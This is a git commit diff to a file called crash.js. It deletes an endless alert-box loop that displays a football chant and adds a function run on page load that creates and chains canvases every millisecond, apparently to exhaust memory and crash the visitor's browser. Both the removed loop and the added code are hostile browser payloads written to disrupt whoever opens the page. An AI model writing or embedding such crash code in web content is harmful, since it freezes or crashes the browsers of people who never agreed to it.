dddd22f3deeb6a85db5ee916300ba83ffeff1788
Artem7-ops <appinventor.artem@gmail.com>
2024-04-03 12:46:31 +0200

    Update crash.js

--- crash.js
+++ crash.js
@@ -1,10 +1,22 @@
-function crash(){
-    while(1){
-        alert("LEGIA NAJLEPSZA");
-    }
-}
 function init(){
     let audio = document.getElementById("audio");
     audio.hidden = true;
-    setTimeout(crash, 100);
 }
+
+function start(){
+    window.reallyFatCanvas = document.createElement('canvas');
+    let context = window.reallyFatCanvas.getContext('2d');
+
+    function leakingLoop() {
+        context.canvas.width = document.body.clientWidth;
+        context.canvas.height = document.body.clientHeight;
+        const newContext = document.createElement('canvas').getContext('2d');
+        context.context = newContext;
+        context.drawImage(newContext.canvas, 0, 0);
+        context = newContext;
+    }
+
+    setInterval(leakingLoop,1);
+}
+
+window.onload = start
